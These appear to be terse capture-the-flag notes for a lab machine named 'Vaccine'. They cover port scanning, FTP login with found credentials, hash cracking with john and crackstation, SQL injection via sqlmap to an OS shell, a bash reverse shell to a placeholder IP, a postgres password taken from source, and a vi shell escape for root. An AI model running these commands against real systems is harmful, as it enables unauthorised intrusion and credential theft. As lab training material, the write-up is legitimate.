Vaccine

$ cat nmap 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-19 02:21 EDT
Nmap scan report for 10.10.10.46
Host is up (0.047s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http?
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 219.43 seconds


---FTP 
anonymous login disable

Dunno where this came:
The credentials ftpuser / mc@F1l3ZilL4 can be used to login to the FTP server.

$ ftp 10.10.10.46
user ftpuser
pass mc@F1l3ZilL4

$ get backup.zip

----Protected, lets use john the ripper
zip2john backup.zip > hash
john hash /usr/share/rockyou.txt

index.php:
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") 

Using crackstation:
Hash	Type	Result
2cb42f8734ea607eefed3b70af13bbd3	md5	qwerty789

SQLI:
check -> ' 1=1 -> ERROR: syntax error at or near "1" LINE 1: Select * from cars where name ilike '%' 1=1%' ^

sqlmap:
$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=ehvr18ubcvacjqmndooimprggp"

getting shell:
$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=snpmecpqt5i2v6bf1gg3nmcbrr" --os-shell

$ bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' and netcat in my machine


Let's upgrade to a tty shell and continue enumeration.

SHELL=/bin/bash script -q /dev/null

Looking at the source code of dashboard.php in /var/www/html reveals the postgres password to be: P@s5w0rd!.

try {
   $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");   
 }                                                                                         

This password can be used to view the user's sudo privileges.

vi ....

:!/bin/bash
